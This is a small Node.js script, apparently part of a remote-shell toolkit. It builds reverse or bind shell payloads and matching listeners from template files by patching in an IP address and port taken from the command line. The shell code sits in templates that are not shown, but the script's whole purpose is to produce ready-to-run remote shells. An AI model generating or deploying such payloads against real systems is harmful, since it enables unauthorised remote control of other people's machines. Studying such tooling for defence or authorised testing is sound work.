const process = require("process");
const fs = require("fs");

const type = process.argv[2];
const ip = process.argv[3];
const port = process.argv[4];
const output = process.argv[5] || "generated_shell";

if(!type || !ip || !port) {
  console.log("Type, IP, and port required to generate shells.");
  console.log("Format: node generate.js <reverse/bind> <ip> <port> <output file (optional)>");
  process.exit(1);
}

if(type != "bind" && type != "reverse") {
  console.log(`Invalid type: ${type}`);
  console.log("Type must be bind or reverse.");
  process.exit(1);
}

if(port != +port) {
  console.log(`Invalid port: ${port}`);
  console.log("The port must be a number.");
  process.exit(1);
}


if(type == "reverse") {
  fs.writeFileSync(output + ".js", fs.readFileSync("reverse.js").toString().replace(`process.argv[3] && +process.argv[3] != process.argv[3]`, `false`).replace(`process.argv[3] || 4444`, port).replace(`process.argv[2] || "127.0.0.1"`, `"${ip}"`));
  fs.writeFileSync(output + "_listener.js", fs.readFileSync("reverse_listener.js").toString().replace(`process.argv[2] && +process.argv[2] != process.argv[2]`, `false`).replace(`process.argv[2] || 4444`, port));
} else if (type == "bind") {
  fs.writeFileSync(output + "_listener.js", fs.readFileSync("bind_listener.js").toString().replace(`process.argv[3] && +process.argv[3] != process.argv[3]`, `false`).replace(`process.argv[3] || 4444`, port).replace(`process.argv[2] || "127.0.0.1"`, `"${ip}"`));
  fs.writeFileSync(output + ".js", fs.readFileSync("bind.js").toString().replace(`process.argv[2] && +process.argv[2] != process.argv[2]`, `false`).replace(`process.argv[2] || 4444`, port));
}
